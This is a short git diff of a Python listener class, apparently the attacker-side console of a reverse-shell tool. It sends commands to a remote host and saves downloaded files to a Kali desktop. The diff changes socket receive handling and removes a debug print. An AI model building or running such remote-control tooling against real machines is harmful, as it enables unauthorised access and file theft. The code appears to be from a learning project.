@@ -40,13 +40,15 @@ class Listener:
         #Al usar un bucle, la función de recibir datos se ejecuta una y otra vez.
         #De esta manera nos aseguramos de que todos los paquetes sean recividos, evitando que se pierda alguno.
         #Así aseguramos la integridad de los mismos.
-            try:
+            '''try:
                 jsonData = self.connection.recv(4096)                
                 return json.loads(jsonData.decode('utf-8'))
             
             except ValueError: 
                 print('Está ocurriendo un error')
-                continue
+                continue'''
+            jsonData = self.connection.recv(8192)                
+            return json.loads(jsonData)
 
     def writeFile(self, path, content):
         with open(f'/home/kali/Desktop/{path}', 'wb') as file:
@@ -68,7 +70,6 @@ class Listener:
                 result = self.remoteAction(command)
 
                 if command[0] == 'descargar':
-                    print(' '.join(command[1:]))
                     result = self.writeFile(' '.join(command[1:]), result)
 
                 print(result)
